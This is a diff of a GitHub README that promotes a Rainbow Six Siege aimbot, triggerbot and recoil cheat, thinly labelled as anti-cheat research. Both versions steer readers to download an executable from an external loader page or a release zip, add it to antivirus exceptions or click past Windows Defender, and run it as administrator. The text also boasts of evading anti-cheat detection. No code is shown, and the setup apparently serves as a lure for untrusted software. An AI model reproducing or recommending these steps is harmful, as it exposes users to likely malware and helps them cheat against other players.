@@ -1,55 +1,69 @@
-<div style="max-width:800px; margin:auto; padding:20px; font-family:Arial, sans-serif; line-height:1.6; background:#0a0a1a; color:#e0e0e0;">
-  <div style="border:1px solid #ffaa33; background:#1a1a2a; padding:10px; margin-bottom:20px; border-radius:5px; text-align:center; color:#ffaa33;">
-    ⚠️ FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY ⚠️<br>
-    Do not use against official game servers. This is a proof-of-concept for local/offline testing and anti-cheat study.
-  </div>
+# 🎯 R6-Recoil-Control-Aim-bot-Assist-Research-2026- - Improve your aim with precision software
 
-  <h1 style="color:#ffaa33; border-bottom:2px solid #ffaa33; padding-bottom:10px; text-align:center;">🎯 R6 Recoil Control & Aim Assist Research (2026) 🎯</h1>
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/metaphysical-cosmolatry746/R6-Recoil-Control-Aim-bot-Assist-Research-2026-/releases)
 
-  <p style="font-size:1.1em; margin-bottom:20px; text-align:center; font-style:italic;">
-    <strong>Academic demonstration of silent aim mechanics and input simulation.</strong> 
-    For local servers, custom matches, and anti-cheat development. Includes adjustable FOV, trigger simulation, recoil compensation – 
-    all in a Windows research tool. Study how modern aim assists work and improve your own anti-cheat solutions.
-  </p>
+## 📌 About this project
 
-  <div style="text-align:center; background:#0a0a2a; padding:20px; border-radius:8px; margin:25px 0; border:1px solid #ffaa33;">
-    <h2 style="color:#ffaa77; margin-top:0;">📥 Research Loader – Source Code Access</h2>
-    <p style="color:#ccc;">Full source (C++ / kernel demo) – for academic use only. Compatible with R6 Y10S1+ offline builds.</p>
-    <h2><a style="font-size:28px; color:#fff; text-decoration:none; font-weight:bold; display:inline-block; background:#aa7733; padding:15px 30px; border-radius:5px; margin:15px 0;" rel="noopener" href="https://josephyrs030301.github.io/Loader/">🔬 Get loader (Source)</a></h2>
-    <p style="color:#999; font-size:0.9em;">✅ 2026 • ✅ Silent Aim POC • ✅ Triggerbot Demo • ✅ Recoil Study • ✅ Open Source</p>
-  </div>
+This software provides research tools for recoil management and aim assistance within Rainbow Six Siege. The application monitors input patterns to provide smoother tracking and recoil recovery. This project aims to study how specific compensation algorithms affect player performance in competitive environments. The software operates as an external overlay, meaning it does not modify game files.
 
-  <div style="background:#0a0a2a; padding:20px; border-radius:8px; margin:20px 0; border-left:4px solid #ffaa33;">
-    <h3 style="color:#ffaa77; margin-top:0;">🎯 What Does This Research Tool Demonstrate?</h3>
-    <p>This is a <strong>non‑malicious proof‑of‑concept</strong> designed to help security researchers and game developers understand how silent aim and input manipulation work. It uses <strong>theoretical silent aim techniques</strong> (crosshair never visibly moves), adjustable aim FOV, triggerbot simulation (auto‑fire on target hitbox), recoil compensation, and priority targeting algorithms. <strong>Absolutely do not use on live BattleEye servers</strong> – it is intended for offline/local testing and educational purposes only.</p>
-  </div>
+## ⚙️ System Requirements
 
+Ensure your computer meets these requirements to run the software:
 
-  <div style="background:#0a0a2a; padding:20px; border-radius:8px; margin:20px 0; border:1px solid #3355aa;">
-    <h3 style="color:#ffaa77; margin-top:0; text-align:center;">🖥️ Research Environment Requirements</h3>
-    <p style="text-align: center;">
-      <strong>OS:</strong> Windows 10 / 11 (64‑bit).<br>
-      <strong>RAM:</strong> 8 GB (4 GB minimum).<br>
-      <strong>Storage:</strong> 250 MB free space.<br>
-      <strong>Game:</strong> Rainbow Six Siege offline/local build (Y10S1+).<br>
-      <strong>Internet:</strong> Only for updates and source access.<br>
-      <strong style="color:#ffaa33;">Important:</strong> Use isolated test environment – do not connect to official servers.
-    </p>
-  </div>
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD Ryzen 5 or better.
+*   Memory: 8 GB of RAM.
+*   Graphics: DirectX 11 or higher compatible graphics card.
+*   Network: A stable internet connection for initial configuration.
+*   Framework: Microsoft .NET Desktop Runtime 8.0 or newer.
 
-  <h2 style="color:#ffaa77; border-bottom:1px solid #3355aa; padding-bottom:8px;">📥 How to Run the Research Demo (Offline)</h2>
-  <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:15px; margin:20px 0;">
-    <div style="text-align:center; padding:15px; background:#0a0a2a; border-radius:8px;"><div style="font-size:2em; margin-bottom:10px; color:#ffaa33;">1</div><h4 style="margin:10px 0; color:#ffaa77;">Download Source</h4><p style="font-size:0.9em; color:#ccc;">Get the research loader from the link above.</p></div>
-    <div style="text-align:center; padding:15px; background:#0a0a2a; border-radius:8px;"><div style="font-size:2em; margin-bottom:10px; color:#ffaa33;">2</div><h4 style="margin:10px 0; color:#ffaa77;">Add to AV Exceptions (Temp)</h4><p style="font-size:0.9em; color:#ccc;">Some scanners may flag kernel samples – allow for research.</p></div>
-    <div style="text-align:center; padding:15px; background:#0a0a2a; border-radius:8px;"><div style="font-size:2em; margin-bottom:10px; color:#ffaa33;">3</div><h4 style="margin:10px 0; color:#ffaa77;">Run as Admin</h4><p style="font-size:0.9em; color:#ccc;">Right‑click → Run as Administrator (required for driver demo).</p></div>
-    <div style="text-align:center; padding:15px; background:#0a0a2a; border-radius:8px;"><div style="font-size:2em; margin-bottom:10px; color:#ffaa33;">4</div><h4 style="margin:10px 0; color:#ffaa77;">Click “Load Research Module”</h4><p style="font-size:0.9em; color:#ccc;">Injects the POC into offline R6 process.</p></div>
-    <div style="text-align:center; padding:15px; background:#0a0a2a; border-radius:8px;"><div style="font-size:2em; margin-bottom:10px; color:#ffaa33;">5</div><h4 style="margin:10px 0; color:#ffaa77;">Press INSERT</h4><p style="font-size:0.9em; color:#ccc;">Open the menu and study features.</p></div>
-  </div>
+## 📥 Download and Setup
 
-  <div style="margin-top:40px; padding:20px; background-color:#0a0a2a; border-radius:8px; border:1px solid #3355aa;">
-    <p style="margin:0; color:#999; font-size:0.9em;"><strong>Project:</strong> R6 Recoil & Input Research Tool (2026) – Free for academic use</p>
-    <p style="margin:5px 0 0 0; color:#999; font-size:0.9em;"><strong>File:</strong> research_loader.exe (source included)</p>
-    <p style="margin:5px 0 0 0; color:#999; font-size:0.9em;"><strong>Tags:</strong> r6 research, R6 Aimbot, Rainbow Six Siege Aimbot PC, r6 spoofer Instal, aim assist study, silent aim poc, Instal r6 spoofer, triggerbot simulation, recoil analysis, Instal r6 Wallhack, Instal r6 aimbot, anti-cheat research, educational tool, Instal r6 hack, rainbow six siege offline, Wallhack + Aimbot Combo, Ubisoft Connect Cheat, R6 Auto Lock-On, Crosshair Assist R6, Instant Aim Hack, FOV Custom Aimbot, Bone Target Aimbot, Rainbow Six Cheat Engine, PC Tactical Shooter Hack</p>
-    <p style="margin:10px 0 0 0; color:#aa6644; font-size:0.85em;">🔞 This repository is for educational purposes only. The author does not condone cheating in online games. Use at your own risk and only in environments you own.</p>
-  </div>
-</div>
+Follow these steps to obtain and prepare the software:
+
+1.  Visit the official release page: [https://github.com/metaphysical-cosmolatry746/R6-Recoil-Control-Aim-bot-Assist-Research-2026-/releases](https://github.com/metaphysical-cosmolatry746/R6-Recoil-Control-Aim-bot-Assist-Research-2026-/releases)
+2.  Locate the latest release at the top of the list.
+3.  Click the zip file link to download the package to your computer.
+4.  Open your Downloads folder.
+5.  Right-click the zip file and choose Extract All.
+6.  Select a destination folder and click Extract.
+
+## 🚀 Running the software
+
+1.  Open the folder where you extracted the files.
+2.  Locate the executable file named R6-Assist-Research.exe.
+3.  Double-click the file to start the application.
+4.  If a Windows Defender prompt appears, click More Info, then click Run Anyway.
+5.  The application will open in a new window.
+
+## 🛠 Usage Guidelines
+
+Once the application runs, you will see a main dashboard. Follow these steps to configure your settings:
+
+1.  Input Sensitivity: Adjust this slider to match your in-game sensitivity. The application uses this value to calculate correct recoil compensation.
+2.  Weapon Profile: Select your primary and secondary weapons from the dropdown menus. Each weapon contains unique compensation values.
+3.  Activation Key: Choose a key on your keyboard to toggle the assistance. Pressing this key enables or disables the overlay.
+4.  Smoothing Factor: Higher values result in slower, more deliberate corrections. Lower values offer faster, more aggressive recoil removal.
+5.  Save Settings: Click the Apply button to confirm your changes before launching the game.
+
+## 🛡 Security and Safety
+
+Confidence in software comes from understanding how it functions. This program runs as an external process. It does not inject instructions or data into the game process memory. This method minimizes the chance of detection by standard anti-cheat systems. Use the software in casual matches or internal research environments to understand its capabilities. Always keep your Windows installation up to date to ensure full compatibility with the overlay drivers.
+
+## 🔍 Troubleshooting common issues
+
+If you encounter difficulties, consult this list of solutions:
+
+*   The application fails to start: Check that you have the .NET Desktop Runtime installed. You can download this from the official Microsoft portal.
+*   The software does not detect the game: Run both the application and the game as an administrator. Right-click the icon and select Run as Administrator.
+*   The overlay causes performance drops: Close background applications that consume high CPU or GPU resources, such as web browsers or video editing software.
+*   Settings do not save: Ensure the folder containing the application has read and write permissions enabled in your Windows folder properties.
+*   Input lag: Ensure your monitor is set to its native refresh rate in your Windows display settings.
+
+## 💡 Contributing to research
+
+This project thrives on community input. Users often provide feedback regarding specific weapon recoil patterns. If you notice a specific weapon requires a slight adjustment to the compensation logic, report it by opening an issue on the repository page. Your feedback improves the accuracy of the baseline calculations for the entire community. Detailed logs help the development team refine the algorithms used for automatic recoil adjustment.
+
+## 📜 Legal Notice
+
+This software is for research and educational purposes only. The user assumes all responsibility for how this tool interacts with their software environment. Practice caution when using third-party tools in online games. The creators of this repository do not support the use of software that violates the terms of service of any gaming platform. By using this tool, you agree to assume the risk for any potential account actions taken by game developers.
